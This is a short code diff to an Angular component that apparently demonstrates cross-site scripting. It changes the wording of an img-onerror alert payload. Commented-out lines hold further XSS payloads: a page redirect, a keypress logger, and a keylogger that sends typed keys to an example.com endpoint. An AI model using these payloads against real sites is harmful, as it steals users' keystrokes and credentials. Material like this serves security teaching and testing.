@@ -19,7 +19,7 @@ export class HomePage implements AfterViewInit {
   @ViewChild("userContent", { static: false }) userContent: ElementRef;
 
   constructor(private renderer: Renderer2, private sanitizer: DomSanitizer) {
-    this.maliciousString = `<img src=nonexistentimage onerror="alert('Hello there')" />`;
+    this.maliciousString = `<img src=nonexistentimage onerror="alert('Hello there.')" />`;
     // this.maliciousString = `<img src=nonexistentimage onerror="window.location='https://www.google.com'" />`;
     // this.maliciousString = `<img src=nonexistentimage onerror="document.onkeypress=function(e){console.log(e.key)}" />`;
     // this.maliciousString = `<img src=nonexistentimage onerror="var keys = [];setInterval(function(){var keyString=keys.join('');fetch('https://example.com/keylogger?keys=' + keyString)}, 10000);}document.onkeypress=function(e){keys.push(e.key);" />`;
